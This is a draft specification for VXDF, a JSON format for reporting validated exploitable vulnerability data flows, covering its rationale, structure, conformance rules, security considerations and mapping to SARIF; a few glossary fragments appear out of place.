# **Validated Exploitable Data Flow (VXDF) Format** 

# **Problem-to-Concept Narrative**

Modern software security teams are overwhelmed by large volumes of potential vulnerability alerts, many of which turn out to be false positives. Static Application Security Testing (SAST) tools can report thousands of code warnings in a large codebase, yet even the best tools still produce false positives around 5% of the time ([Why Static Code Analysis Doesn’t Belong Into Your CI](https://www.code-intelligence.com/blog/why-static-code-analysis-doesnt-belong-into-your-ci#:~:text=The%20fundamental%20disadvantage%20of%20static,million%20LoC%20is%20approximately%2020%2C000)). In practice this means hundreds or thousands of non-issues that developers must sift through, leading to “alert fatigue” and wasted effort. One industry report estimated organizations spend over 21,000 hours annually investigating false alarms – time that could be spent fixing real vulnerabilities. This overload causes frustration and teams may start ignoring scanner outputs, increasing the risk that true critical issues get overlooked.

On the other side, dynamic testing and manual penetration tests can definitively prove exploits but often happen late in the cycle and are not easily correlated back to specific code paths. There is a gap between **potential** issues reported by automated scanners and **confirmed** exploitable issues that developers can trust and act on immediately. Today, when a static tool flags a possible vulnerability (e.g. “unvalidated input flows into SQL query”), a security engineer typically must manually reproduce or verify the issue before convincing developers to fix it. This process is ad-hoc and not standardized – some teams attach proof-of-concept inputs or stack traces in a ticket, others might provide a narrative, but there’s no common format to bundle a code **data flow** with the evidence that it’s truly exploitable. Consequently, critical context can get lost in translation.

VXDF (Validated Exploitable Data Flow) is designed to solve this problem by providing a **unified, evidence-backed format** for describing code vulnerability flows. It acts as the missing link between static analysis findings and actionable security bugs. Each VXDF record describes a **data flow** from a vulnerability’s source to sink (the entry point of untrusted data to the point where it causes harm), and critically, includes **validation evidence** that the flow is exploitable in practice. By capturing both the technical trace and proof (such as a test payload that triggers the issue), VXDF files let security tools, developers, and auditors exchange confirmed vulnerability information in a machine-readable yet human-comprehensible way.

Consider a typical scenario: A SAST tool flags a SQL injection path in a web application. Instead of producing a lengthy PDF or proprietary output that developers might distrust, the tool (or a follow-up verification step) generates a VXDF document for each detected flow. The VXDF contains the code locations of the untrusted input and the dangerous query, an explanation of the path data takes, and an example input that was used to successfully exploit the issue (e.g. a sample malicious username that logs in without a password). When the developer receives this VXDF report, they see the exact lines of code and a proof that the issue is real – greatly reducing ambiguity and back-and-forth. The standardized JSON format means the report could also be ingested by other security systems: for instance, a central vulnerability management platform can combine VXDF outputs from multiple tools, or a bug bounty program could require submissions in VXDF for consistency.

In summary, VXDF’s **value proposition** is to streamline the vulnerability fix cycle by focusing on **validated exploitable flows**. It filters out noise (each flow must have supporting evidence), provides precise code-level context (source and sink locations, and the path between them), and does so in a format that is tool-agnostic and easy to integrate. This bridges the gap between automated scanning and remediation: developers get high-fidelity security bug reports they can trust, and security teams can more easily hand off confirmed issues. VXDF aims to become a standard that various SAST/DAST tools, security researchers, and organizations can adopt, much like how SARIF standardized static analysis output ([Unlocking the Power of SARIF: The Backbone of Modern Static Analysis \- DEV Community](https://dev.to/shivasurya/unlocking-the-power-of-sarif-the-backbone-of-modern-static-analysis-9lc#:~:text=SARIF%20,triage%2C%20and%20act%20on%20vulnerabilities)), or how SPDX standardized software bill-of-materials data ([SPDX: It’s Already in Use for Global Software Bill of Materials (SBOM) and Supply Chain Security \- Linux Foundation](https://www.linuxfoundation.org/blog/blog/spdx-its-already-in-use-for-global-software-bill-of-materials-sbom-and-supply-chain-security#:~:text=SPDX%20is%20an%20open%20standard,identification%20and%20monitoring%20of%20software)). By focusing on **exploitable data flows**, VXDF complements these efforts (for instance, SARIF can list potential issues, and VXDF can be used for the subset that are confirmed; SPDX can enumerate components, and VXDF can describe vulnerabilities found in those components). Ultimately, VXDF helps teams **prioritize real risks** and **share actionable security findings** in a consistent way, improving remediation times and reducing fatigue from false positives.

# **VXDF Specification Document**

## **Rationale & Goals**

### **Rationale**

VXDF was created to address specific pain points in application security validation and communication:

* **Filtering Noise:** Security teams struggle with high false-positive rates from static analysis tools, which consume time and erode trust ([Why Static Code Analysis Doesn’t Belong Into Your CI](https://www.code-intelligence.com/blog/why-static-code-analysis-doesnt-belong-into-your-ci#:~:text=The%20fundamental%20disadvantage%20of%20static,million%20LoC%20is%20approximately%2020%2C000)). VXDF tackles this by requiring evidence for each reported flow, ensuring that every entry corresponds to a proven issue rather than a mere suspicion. This means consumers of VXDF data (developers, auditors, or tools) can have greater confidence that “if it’s in VXDF, it’s real,” focusing their effort only on impactful, confirmed vulnerabilities.

* **Unified Format:** In the current state, each security tool often has its own output format or dashboard ([Unlocking the Power of SARIF: The Backbone of Modern Static Analysis \- DEV Community](https://dev.to/shivasurya/unlocking-the-power-of-sarif-the-backbone-of-modern-static-analysis-9lc#:~:text=Static%20analysis%20tools%20are%20indispensable,standard%20that%20streamlines%20this%20process)). This fragmentation makes it difficult to aggregate results or integrate into DevSecOps pipelines. VXDF provides a unified JSON-based format for exploitable-flow reports, enabling interoperability. Different scanning tools (SAST, DAST, fuzzers, manual pen-test notes) can output VXDF, and a single pipeline can collate these into one view. This streamlines workflows and reduces custom scripting and manual result translation.

* **Actionable Detail:** Often vulnerability reports lack the detailed context developers need to quickly reproduce and fix the issue. VXDF explicitly includes the **source location** (where tainted data comes from), the **sink location** (where the exploit occurs), and an optional step-by-step trace of how data travels. This satisfies the developers’ need to understand *exactly* what to fix and why. Additionally, the included evidence (like an exploit string or test case) demonstrates the impact (e.g. “using payload X yields admin access”), which can motivate prompt fixes and help in verifying that a patch actually resolves the problem.

* **Bridging Gaps:** VXDF is designed as a bridge between high-level vulnerability advisories and low-level code specifics. For example, vulnerability exchange formats like VEX focus on stating whether a product is affected by a known issue ([Vulnerability Exploitability eXchange (VEX) – Use Cases](https://www.cisa.gov/sites/default/files/2023-01/VEX_Use_Cases_Aprill2022.pdf#:~:text=The%20goal%20of%20Vulnerability%20Exploitability,machine%20readable%2C%20built%20to%20support)), but they don’t describe *how* the vulnerability manifests in code. VXDF fills that gap by conveying the technical narrative of an exploit’s path. It can be used internally (e.g., security team to development team) or externally (e.g., a researcher reporting a bug to a vendor) in a consistent way. It also complements Software Bill of Materials (SBOM) standards like SPDX ([SPDX: It’s Already in Use for Global Software Bill of Materials (SBOM) and Supply Chain Security \- Linux Foundation](https://www.linuxfoundation.org/blog/blog/spdx-its-already-in-use-for-global-software-bill-of-materials-sbom-and-supply-chain-security#:~:text=SPDX%20is%20an%20open%20standard,identification%20and%20monitoring%20of%20software)) by linking *from* a component in an SBOM *to* detailed vulnerability flow information.

* **Ease of Automation:** A structured format like VXDF enables automation in vulnerability management. Tools can automatically **validate** scanner findings by attempting exploits and then output a VXDF report if successful. CI/CD pipelines could automatically reject a build that introduces a new VXDF-described vulnerability. Likewise, ticketing systems can ingest VXDF to auto-create richly detailed bug tickets. The design of VXDF emphasizes machine-readability (JSON with a defined schema) so that such automation is straightforward, while also remaining human-friendly (readable field names, optional code snippets, etc.).

### **Goals**

* *Interoperability:* Provide a common language for different security tools and teams to exchange verified vulnerability flow information. A VXDF file generated by one tool **MUST** be usable by others (e.g., a DAST tool’s output could be read by a code analysis dashboard for developers) with minimal translation.

* *Precision:* Capture the essential details of an exploitable data flow – including the code locations of sources and sinks – in a precise manner. The format **SHOULD** minimize ambiguity (for example, clearly distinguishing source vs sink, and using explicit fields for things like severity, CWE, etc.).

* *Evidence-centric:* Emphasize validation evidence. Every flow **MUST** carry some proof or explanation of exploitability. This directly addresses the false-positive problem by design.

* *Simplicity:* Keep the format as lean as possible while still covering necessary information. It **SHOULD** be easy to produce and consume by typical JSON libraries. Unnecessary complexity or deeply nested structures are avoided, so that even a simple script or a developer with minimal JSON experience can make sense of a VXDF file.

* *Extensibility:* Recognize that different organizations or tools might have custom needs. The spec defines an extension mechanism (via vendor-specific `x-*` fields) to allow adding extra information without breaking compliance. One goal is to enable experimentation and domain-specific additions (e.g., adding a company’s internal risk score) while maintaining a core standard.

* *Align with Existing Standards:* Where possible, reuse or map to concepts from existing standards (like SARIF for static analysis results, or CWEs for weakness classification) instead of reinventing terminology. VXDF aims to complement, not conflict with, widely adopted frameworks. An explicit goal is to ensure VXDF can be easily **mapped** to SARIF and linked to SBOMs (SPDX), which will aid adoption and integration (detailed in Appendix C).

By achieving these goals, VXDF v1.0 intends to significantly improve how validated security findings are documented and shared, ultimately reducing time-to-fix for critical vulnerabilities and fostering greater collaboration between security and development teams.

* **AffectedComponent (**ExploitFlow.affectedComponents\[\]**)**: An object that describes a specific software component, library, hardware device, configuration file, service, or other asset that is implicated in the vulnerability. It includes identifiers like PURL or CPE, version, and componentType. This is crucial for non-flow based vulnerabilities or to specify the primary components involved in any vulnerability. (See $defs/AffectedComponent in Appendix A: Normative JSON Schema and Appendix O for componentType definitions ).  
* **ApplicationInfo (**VXDFPayload.applicationInfo**)**: An object within the VXDF document root that provides metadata about the application, system, or product that was assessed, including its name, version, and identifiers like PURL or CPE.

Keys within customProperties should ideally be namespaced.  
* **Evidence (**ExploitFlow.evidence\[\]**)**: A mandatory component of every ExploitFlow. It is an array of one or more Evidence objects, each providing structured, machine-readable proof that validates the exploitability of the vulnerability. Each Evidence object has an evidenceType and a corresponding structured data field. (See $defs/Evidence in Appendix A: Normative JSON Schema and Appendix Q for evidenceType definitions ).

(See $defs/Severity in Appendix A: Normative JSON Schema and Appendix K for level definitions ).  
* **Sink (**ExploitFlow.sink**)**: (Primarily for flow-based vulnerabilities) A Location object describing the endpoint of a data flow where untrusted data or control is consumed in a way that manifests the exploit (e.g., a function executing a SQL query, code rendering unescaped data to HTML).

# VXDF Document Structure

A Validated Exploitable Data Flow (VXDF) document is a JSON object designed to represent one or more validated, exploitable security vulnerabilities with detailed evidence. The structure is organized to be both machine-readable for automation and human-comprehensible for analysis and remediation. The top-level VXDF document consists of metadata about the report itself and a primary array containing the details of each validated exploit flow or vulnerability instance.

**1\. Root Document Object (**VXDFPayload**)**

The root of a VXDF document is an object, referred to conceptually as VXDFPayload, and has the following key properties:

* vxdfVersion (String, Mandatory): Specifies the version of the VXDF schema to which this document conforms. For this specification, it MUST be "1.0.0".  
* id (String, Mandatory, UUID Format): A universally unique identifier (UUID) for this VXDF document. This allows the entire report to be uniquely referenced.  
  * Example: "a1b2c3d4-e5f6-7890-1234-567890abcdef"

* customProperties (Object, Optional): A key-value map for arbitrary custom data relevant to the entire document that is not covered by other standard fields. Keys should ideally be namespaced to avoid collisions.

**2\.** ExploitFlow **Object Structure**

Each object within the exploitFlows array provides detailed information about a specific validated vulnerability. Its structure is designed to be flexible for both flow-based and non-flow-based vulnerabilities:

* id (String, Mandatory, UUID Format): A UUID uniquely identifying this specific ExploitFlow instance within the VXDF document, and ideally globally if findings are aggregated.

* **Describing the Vulnerability Locus**: An ExploitFlow SHOULD provide details using one or both of the following approaches:  
  * **Flow-Based Details** (for vulnerabilities involving data flow):  
    * source (Object, Location, Optional): Describes the entry point of untrusted data or the starting point of the exploit. (See $defs/Location in Appendix A and Appendix M).  
    * sink (Object, Location, Optional): Describes the point of exploitation where the vulnerability manifests. (See $defs/Location in Appendix A and Appendix M).  
    * steps (Array of TraceStep Objects, Optional): An ordered sequence detailing the data flow or exploit path from source to sink. (See $defs/TraceStep in Appendix A and Appendix N).  
  * **Component-Based Details** (essential for non-flow vulnerabilities, and can augment flow-based ones):  
    * affectedComponents (Array of AffectedComponent Objects, Optional): Details specific software components, libraries, hardware, services, or configuration files that are vulnerable or contribute to the vulnerability. (See $defs/AffectedComponent in Appendix A and Appendix O).  
  * *(Guidance: An ExploitFlow MUST provide substantive details using either both source and sink properties OR at least one item in the affectedComponents array. It MAY include both if appropriate.)*

* correlationGuids (Array of Strings, Optional): An array of globally unique identifiers used to correlate this finding with related findings in other systems.  
* customProperties (Object, Optional): A key-value map for arbitrary custom data specific to this ExploitFlow. Keys should ideally be namespaced.

**3\. Supporting Object Definitions**

The ExploitFlow object utilizes several other complex objects to provide detailed information. These include Location, TraceStep, AffectedComponent, Severity (and its CVSS variants), and Evidence (and its data variants). The formal structures of these objects, including their properties, data types, and controlled vocabularies, are normatively defined in Appendix A: Normative JSON Schema and further described in their respective descriptive appendices (J-Q).

**4\. Extensibility**

VXDF is designed to be extensible. Beyond the defined customProperties bags, if implementers need to include additional, tool-specific, or experimental data not covered by the standard schema, they MUST prefix such custom fields with x- (e.g., x-mytool-internal-score). Conforming VXDF consumers SHOULD ignore any x- prefixed fields they do not recognize, ensuring forward compatibility. (See Appendix F: Extension Mechanism).

**Summary of Benefits of This Structure**

This refined VXDF document structure aims to provide a comprehensive yet flexible format that:

* Clearly identifies the validated vulnerability (title, id, category, cwe).  
* Quantifies its potential impact (structured severity with CVSS integration).  
* Precisely locates the vulnerability, whether it's a code flow (source, sink, steps) or an issue within a specific component or configuration (affectedComponents, using detailed Location objects).  
* Crucially, provides rich, structured, and machine-readable evidence of exploitability (evidence array with typed, structured data), catering to a vast range of validation methods and exploitability components.  
* Maintains interoperability through defined mappings and correlation identifiers.  
* Allows for standardized yet extensible reporting.

# **JSON Schema (Normative)**

The normative JSON Schema definition for Validated Exploitable Data Flow (VXDF) v1.0.0 is provided in Appendix A. This schema precisely defines the allowed structure of a VXDF JSON document. A VXDF file \`MUST\` validate against this schema to be considered compliant.

The schema is written in JSON Schema draft 2020-12 format for precision, but any equivalent validation mechanism or code is acceptable as long as it enforces the same rules. Adherence to this schema is critical for interoperability.

# **Conformance & Validation**

This section describes what it means for a VXDF document, as well as for tools that produce or consume VXDF documents, to conform to the VXDF v1.0.0 specification. Adherence to these conformance criteria is essential for ensuring interoperability and the reliable exchange of validated vulnerability information.

## **1\. VXDF Document Conformance:**

A VXDF document is conformant if it meets all of the following criteria:

* 1.1. Valid JSON: It MUST be a syntactically valid JSON object as defined by ECMA-404 and RFC 8259\.  
* 1.2. Character Encoding: It MUST be encoded in UTF-8.  
* 1.3. Schema Adherence: It MUST validate against the normative VXDF v1.0.0 JSON Schema provided in this specification (see Appendix A: VXDF JSON Schema). This includes adherence to all defined properties, data types, formats (e.g., date-time, uuid), required fields, and controlled vocabularies (enums).  
* 1.4. Root Object Requirements:  
  * It MUST have a top-level object containing the mandatory properties: vxdfVersion, id, generatedAt, and exploitFlows, as defined in the schema.  
  * The vxdfVersion property MUST have the string value "1.0.0".  
  * The id property (document identifier) MUST be a string formatted as a UUID.  
* 1.5. exploitFlows Array:  
  * The exploitFlows array MUST be present and MUST contain at least one ExploitFlow object. An empty exploitFlows array is not permitted; if no validated, exploitable vulnerabilities are found, a VXDF document should typically not be produced for that specific scope or should clearly indicate such via external means or within a broader reporting context.  
* 1.6. ExploitFlow Object Requirements: Each ExploitFlow object within the exploitFlows array MUST adhere to its definition in the JSON schema, including:  
  * Mandatory Properties: It MUST include the properties: id, title, severity (as a structured object with at least the level field), category, evidence, and validatedAt.  
  * Identifier (id): The id property of an ExploitFlow MUST be a string formatted as a UUID and SHOULD be unique within the VXDF document. For aggregation purposes, globally unique ExploitFlow IDs are recommended.  
  * Locus Description: Each ExploitFlow MUST describe the locus of the vulnerability. It MUST provide substantive details using either:  
    * Both source and sink properties (for flow-based vulnerabilities), OR  
    * At least one item in the affectedComponents array (for non-flow or component-centric vulnerabilities). An ExploitFlow MAY include both flow-based details and affectedComponents if appropriate for clarity.  
  * Evidence (evidence array):  
    * It MUST contain at least one Evidence object.  
    * Each Evidence object MUST include the evidenceType, description, and a data object.  
    * The structure of the Evidence.data object MUST conform to the specific schema defined for the declared Evidence.evidenceType (as detailed in the $defs/EvidenceDataVariant section of the JSON schema).  
* 1.7. String Content: All string property values MUST NOT contain control characters that are not permitted in JSON strings. If special characters (e.g., newlines, quotes) are part of the string data, they MUST be properly escaped according to JSON string encoding rules.  
* 1.8. Timestamps: Properties defined with format: "date-time" (e.g., generatedAt, validatedAt, Evidence.timestamp) MUST follow the ISO 8601 date-time format, preferably including the UTC 'Z' designator or a timezone offset (e.g., "2025-05-17T10:00:00Z", "2025-05-17T12:30:00+02:00"). If no timezone is specified, consumers may assume UTC but this practice is discouraged for timestamps representing specific moments.  
* 1.9. steps Array Logic (If Present): If a steps array is provided within an ExploitFlow (for flow-based vulnerabilities):  
  * It SHOULD represent a logical and ordered sequence of operations or data propagation points from the source to the sink.  
  * Each TraceStep object within the array MUST include the order, location, and description properties.  
  * While the schema allows flexibility, producers SHOULD ensure that the steps provide a coherent trace that aids in understanding the exploit path.  
* 1.10. Location Object Content: The content of Location objects (used in source, sink, steps, and AffectedComponent.locations) SHOULD be relevant and appropriately detailed for the specified locationType. For example, file paths should be meaningful within the context of the target system (e.g., project-relative, absolute if necessary and unambiguous, or a URI). The format of specific location properties (like filePath) is not strictly mandated beyond being a string, but producers SHOULD strive for consistency and clarity, documenting their path conventions if they are non-standard.  
* 1.11. Unknown Properties (Strictness):  
  * A VXDF document MUST NOT contain additional properties at the root level or within standard VXDF objects (ExploitFlow, Severity, Evidence, etc.) that are not explicitly defined in the schema, unless such properties are part of a defined customProperties bag or are prefixed with x- as described below.  
  * The schema enforces this for most objects using additionalProperties: false. Violations (e.g., a misspelled standard property name like "severtiy") will render the document non-conformant.  
* 1.12. Extensibility (customProperties and x- Prefixes):  
  * customProperties Bags: Where defined (e.g., at the root, ExploitFlow, ApplicationInfo, Location, Evidence, AffectedComponent, TraceStep), customProperties objects allow for arbitrary key-value pairs. Keys within these bags SHOULD be namespaced (e.g., "com.example.internalRisk": "High") to avoid collisions.  
  * x- Prefixed Fields: For custom data outside of designated customProperties bags, or when a custom field needs to be at the same level as standard fields (though this is less common), such fields MUST be prefixed with x- (e.g., "x-legacy-finding-id": "OLD-123"). The schema allows for these via patternProperties: {"^x-": {}} in conjunction with additionalProperties: false for the standard fields.  
  * Values of extension fields or custom properties MUST be valid JSON data types.  
* 1.13. Handling Future Versions: A conformant VXDF v1.0.0 consumer encountering a VXDF document with a vxdfVersion greater than "1.0.0" MAY attempt to process it on a best-effort basis but SHOULD be cautious and clearly indicate if it cannot fully support the newer version. It MAY ignore unrecognized fields from a future minor or patch version if that version guarantees backward compatibility. For future major versions, significant changes are possible, and v1.0.0 consumers are not expected to fully process them without updates.

## **2\. Producer Conformance:**

A tool, system, or process that generates (produces) VXDF documents is conformant if it meets the following criteria:

* 2.1. Output Valid Documents: It MUST output VXDF documents that are conformant according to all criteria listed in Section 1 (VXDF Document Conformance).  
* 2.2. Populate Mandatory Information: It MUST populate all mandatory fields defined in the VXDF JSON schema with valid and accurate data according to their definitions. For example, every ExploitFlow MUST include at least one Evidence object with a valid evidenceType and a corresponding structured data object.  
* 2.3. Use Fields As Intended: It SHOULD use all schema-defined fields according to their semantic meaning as described in this specification. For instance, the severity object should accurately reflect risk, and category should use recommended terms where possible. Custom or internal metrics not fitting standard fields SHOULD be placed in customProperties or use x- prefixes.  
* 2.4. Minimize Sensitive Data Exposure: Producers SHOULD NOT include sensitive data (e.g., PII, credentials, proprietary source code beyond necessary snippets, raw private keys) in VXDF output unless it is absolutely essential for understanding or validating the vulnerability and cannot be masked or anonymized. Refer to the "Security & Privacy Considerations" section.  
* 2.5. Schema Reference: It SHOULD include the $schema keyword in the root of the JSON document, pointing to the canonical URL of the VXDF v1.0.0 JSON schema (e.g., "https://vxdf.org/schemas/vxdf-1.0.0.json").  
* 2.6. Data Duplication and Referencing: If multiple ExploitFlow objects share common elements (e.g., the same piece of evidence applies to multiple flows, or multiple flows target the same AffectedComponent):  
  * For Evidence, if an Evidence object is given a unique id, other parts of the VXDF document (like TraceStep.evidenceRefs or AffectedComponent.evidenceRefs) MAY reference it. This can reduce some duplication if the evidence itself is complex to state multiple times.  
  * For other shared information (e.g., multiple ExploitFlows originating from the same source but affecting different sinks), VXDF v1.0.0 generally requires such information to be stated within each relevant ExploitFlow. Producers SHOULD handle this by either fully populating each ExploitFlow or by using correlationGuids if the intent is to link conceptually related but distinct flows.

## **3\. Consumer Conformance:**

Software or a process that reads or ingests (consumes) VXDF documents is conformant if it meets the following criteria:

* 3.1. Schema Validation (Recommended): It SHOULD validate incoming VXDF documents against the VXDF v1.0.0 JSON Schema. If a document is found to be non-conformant, the consumer SHOULD reject it or handle the errors gracefully (e.g., log a warning, process only valid portions if feasible and clearly communicated). Consumers MUST NOT blindly trust the structure of an incoming document if validation is not performed.  
* 3.2. Semantic Interpretation: It MUST interpret the properties and values within a conformant VXDF document according to the semantics defined in this specification. For example, it must understand the structure of the severity object, the meaning of different evidenceType values and their corresponding data structures, and the distinction between source/sink and affectedComponents.  
* 3.3. Handling Extensions:  
  * It MUST ignore any x- prefixed properties it does not recognize without erroring, provided the rest of the document is conformant.  
  * It MAY process recognized x- prefixed properties if it has specific knowledge of them.  
  * When encountering customProperties bags, it MAY choose to process known keys within them or ignore the entire bag or specific unknown keys.  
* 3.4. Processing Known Fields: Consumers SHOULD NOT silently ignore known, standard fields defined in the schema, even if they choose not to utilize the information from every field in their primary functionality. If a consumer re-serializes or transforms VXDF data, it SHOULD endeavor to preserve all standard information to avoid data loss.  
* 3.5. Evidence Processing (Recommended): While not strictly required for basic conformance, consumers (especially those involved in triage, analysis, or automated response) SHOULD attempt to parse and utilize the structured data field within Evidence objects based on the evidenceType. The richness of VXDF lies in this structured evidence.  
* 3.6. Data Mapping Integrity: If a consumer maps VXDF data into another format or system (e.g., a bug tracker, a risk management platform), it SHOULD strive to maintain the integrity and key semantic details of the original VXDF information, particularly the validated nature, severity, locus, and evidence.

## **4\. Schema Validation Process:**

The normative VXDF v1.0.0 JSON Schema provided in this specification is the authoritative definition for validating VXDF documents.

* Tools: Standard JSON Schema validators compliant with JSON Schema Draft 2020-12 (or later compatible drafts) SHOULD be used.  
* Checks: Validation MUST verify:  
  * Presence and correct data types/formats of all mandatory properties.  
  * Adherence to enumerated values for controlled vocabularies.  
  * Correct structure of complex objects, including the Evidence.data variants based on evidenceType.  
  * Absence of disallowed additional properties (unless they are valid x- prefixed extensions or within customProperties bags).  
* Outcome: If any validation check against the normative schema fails, the document is considered non-conformant.

The VXDF project MAY provide a reference test suite (see Appendix G) containing valid and invalid VXDF document examples to assist implementers in developing and verifying their conformance.

In summary, a conformant VXDF ecosystem relies on producers generating schema-valid documents with accurate, evidence-backed vulnerability data, and consumers correctly interpreting this structured information. Adherence to these conformance rules ensures that VXDF can serve as a reliable and interoperable standard for communicating validated exploitable vulnerabilities.

# **Security & Privacy Considerations**

VXDF documents by their nature contain sensitive security information. It’s important to handle them carefully to avoid introducing new risks. Here are considerations for both producers and consumers regarding security and privacy:

**Sensitive Information in VXDF:** A VXDF file describes vulnerabilities, which are sensitive until those issues are fixed (and even afterward, details might be sensitive). For example, a VXDF might contain an SQL injection that could be used to extract data. If such a file is exposed publicly or to unauthorized parties, it could guide attackers. **Therefore, treat VXDF files as sensitive artifacts.** Access should be controlled similarly to how one would handle vulnerability reports or penetration test results. If stored in a repository, limit who can see it. If transmitted, use secure channels.

**Evidence Content:** Evidence often includes exploit payloads or outputs. These could inadvertently contain private data or dangerous strings:

* If real user data was used during testing (e.g., copying a user’s email as part of an XSS payload), the evidence description might leak that personal data. **Producers SHOULD scrub or anonymize** any personal or confidential data from evidence. It’s better to use synthetic examples in proofs (like a generic admin username or dummy credit card number) rather than actual data.

* Payloads in evidence might include characters that, if the VXDF is viewed in certain contexts (like an HTML report), could be misinterpreted (for example, an XSS payload in the evidence might execute if a viewer naively renders the JSON to HTML without escaping). **Consumers SHOULD escape/encode** any output they display from VXDF to ensure that no embedded script or HTML from the evidence can execute in the context of the viewing application. In other words, treat VXDF content as data, not as code, when displaying it. This prevents any chance of, say, a VXDF with an XSS evidence triggering an XSS in a web-based viewer.

* If evidence includes file attachments or references (like a path to a pcap file or a screenshot image), ensure those are handled safely. Do not automatically execute or open referenced files without user consent. For example, if an evidence points to a `.exe` file or script as part of the exploit proof, a consumer tool should not run it automatically – that could itself be malicious.

**False or Malicious Data in VXDF:** While VXDF is intended for validated flows, one must consider the possibility of a malicious actor creating a VXDF file with false information or even malicious intent (for example, a VXDF that intentionally includes huge payload data to crash a tool, or tries to exploit a parsing vulnerability in a consumer). To mitigate this:

* **Do not execute content:** As mentioned, nothing in a VXDF should be executed. Even the code snippets are just text. A consumer should not, for instance, dynamically run the code in `snippet` fields – those are likely vulnerable code\! They are there for reference only.

* **Resource use:** A VXDF file could be very large (e.g., thousands of flows, or extremely large snippet strings) which might exhaust memory or storage. Consumers should implement reasonable limits or streaming processing. Likewise, producers should avoid including excessively large data (e.g., don’t embed an entire log file as a snippet; maybe summarize it).

* **Validation of input:** If a system receives a VXDF file from an external source (say, a bug bounty submission in VXDF format), the system should validate it against the schema and possibly additional checks. Don’t assume the file is harmless JSON – it could be crafted to exploit a bug in the JSON parser. Use up-to-date JSON libraries and consider sandboxing the processing if high-risk.

**Privacy of Code:** VXDF contains code excerpts (snippets) which might be proprietary. If sharing VXDF outside the organization (e.g., with a vendor or open-source project to report an issue), consider the sensitivity of those code snippets. Are they revealing any intellectual property or secrets? Typically, showing a line of code that handles input or does a query is fine, but it’s worth double-checking. If necessary, the snippet could be omitted or generalized to avoid exposing internal logic unnecessarily, as long as the description and evidence are enough to understand the issue. VXDF allows snippet to be optional for such reasons.

**Distribution and Storage:** There is currently no built-in encryption or access control in the VXDF format – it’s plain JSON. If you need to share a VXDF file over an untrusted medium, use external means to secure it (encryption, secure file transfer, etc.). Similarly, if storing VXDF in a database or as part of an SBOM system, treat it as you would treat vulnerability details. In some cases, you might not want to store the exploit payload at all in a long-lived system; VXDF’s evidence is critical for confirmation but once the issue is resolved, some may choose to redact or remove the actual exploit strings from records to prevent misuse. This is a policy decision outside the spec, but the spec enables identifying the relevant parts to remove if needed (e.g., one could strip the evidence section for archive records, once no longer needed, keeping just the fact that it was confirmed).

**Media Type and Handling:** When a VXDF file is exchanged (e.g., via email or API), it should be labeled with the proper media type (as suggested in the IANA section). This helps systems recognize it and perhaps apply special handling. For example, a security issue tracker might flag any incoming `application/vxdf+json` file for restricted access or scanning.

**Integrity:** If a VXDF file is sent across systems, ensure its integrity. A cryptographic hash or signature can help ensure it wasn’t tampered with. The spec doesn’t mandate a signing mechanism, but in a high-security context, sending a signed VXDF (or via a protocol that ensures integrity) is advisable. Tampering could otherwise change evidence or details (though the risk is similar to any vulnerability report being tampered).

**Privacy Consideration \- Relation to Individuals:** VXDF is primarily about code and exploits, not personal data. However, if an exploit involves user data (like stealing someone’s info), the evidence or description might reference personal data. Authors of VXDF content **SHOULD** avoid including real personal identifiers in examples. If a vulnerability is reported on a specific user’s account or data, better to abstract it (e.g., use `<victim>` or a generic identifier). This reduces privacy concerns and compliance scope (for example, avoiding personal data means likely no GDPR issues in sharing the VXDF).

In conclusion, VXDF doesn’t introduce significant new security concerns beyond those inherent in sharing vulnerability details. The main advice is to **treat VXDF files as sensitive** and to handle the content within carefully (no blind execution, proper escaping when viewing, mindful inclusion of data). By following these practices, users of VXDF can safely benefit from its rich detail without exposing themselves to additional risk.

# **IANA Considerations / Media-Type Registration (Stub)**

This specification anticipates the need for a dedicated media type to identify VXDF documents when they are transferred or stored. We intend to register a media type with the Internet Assigned Numbers Authority (IANA) for VXDF. Pending official registration, the provisional suggestion is:

* **Media Type Name:** application

* **Media Subtype:** vxdf+json (or possibly **vnd.vxdf+json** if a vendor tree is needed initially)

Thus, a full media type string could be `application/vxdf+json`. This indicates that the content is a VXDF JSON document. The “+json” suffix aligns with IANA recommendations for JSON-based media types, making it clear that it's JSON and allowing generic JSON processors to handle it if needed.

**Intended Usage:** COMMON  
 This media type would be used in tooling (for example, REST APIs returning VXDF results, file attachments in bug reports, etc.) to signify that the payload is a VXDF vulnerability report. Tools or email clients might use this to automatically route the data to the right handler (for instance, an IDE could register to open `vxdf+json` files with a specialized viewer).

**Encoding:** UTF-8 (since JSON standard recommends/assumes UTF-8). If binary packaging is ever needed (e.g., VXDF with attachments), that would be a separate consideration (like embedding in a zip), but the JSON itself is text.

**File Extension:** We suggest “`.vxdf.json`” or “`.vxdf`” as a file extension for VXDF files. For example, `report.vxdf.json` could be a typical file name. If `.vxdf` alone is used, systems should still treat it as text/JSON.

**Considerations:** The media type registration will include a reference to this specification and indicate that no special magic numbers are present beyond the JSON opening `{`. Security considerations in the registration will reference the section above.

*Note:* This section is a stub for the formal registration. The actual request to IANA will be made when the specification is finalized, possibly under the standards tree if VXDF is adopted by a standards body, or vendor tree during its draft phase. In the meantime, developers MAY use the `application/vxdf+json` media type informally to label content, understanding that it’s not yet an official IANA registered type. Alternatively, until registration, `application/json` with a specific file extension is acceptable.

By defining a distinct media type, we make it easier for systems to recognize VXDF content and handle it appropriately (for example, apply JSON schema validation automatically, or trigger security handling as mentioned). We will update this section with the final details once registration is complete.

# Appendix C: Mapping to SARIF and SPDX

VXDF is designed to complement existing standards by providing a focused format for validated, exploitable vulnerabilities. This appendix outlines how VXDF data can relate to or be translated into two relevant formats: SARIF (Static Analysis Results Interchange Format) for code analysis results, and SPDX (Software Package Data Exchange) for software inventory and vulnerability metadata. Understanding these mappings is crucial for integrating VXDF into broader DevSecOps ecosystems and toolchains.

## **Mapping VXDF to SARIF (Static Analysis Results Interchange Format) v2.1.0**

The Static Analysis Results Interchange Format (SARIF) is an OASIS standard for the output of static analysis tools. While SARIF is a comprehensive format capable of representing a wide variety of analysis results (including those with or without code flows, and with varying levels of confidence), VXDF specializes in representing *validated, exploitable* vulnerabilities, backed by concrete evidence.

Despite VXDF's specific focus, a validated finding described in a VXDF ExploitFlow can be represented within a SARIF result object. This allows VXDF data to be consumed by SARIF-aware tools, although some of VXDF's rich validation-specific semantics might require custom properties within SARIF for full fidelity.

Here’s how key elements of a refined VXDF v1.0.0 document can correspond to SARIF elements:

1. ### **VXDF Root Object to SARIF run Object:** 

   * A single VXDF document, representing an assessment or validation activity, typically maps to a single SARIF run object.  
   * VXDFPayload.vxdfVersion: Can be stored in run.conversion.tool.driver.semanticVersion or as a property in run.properties.  
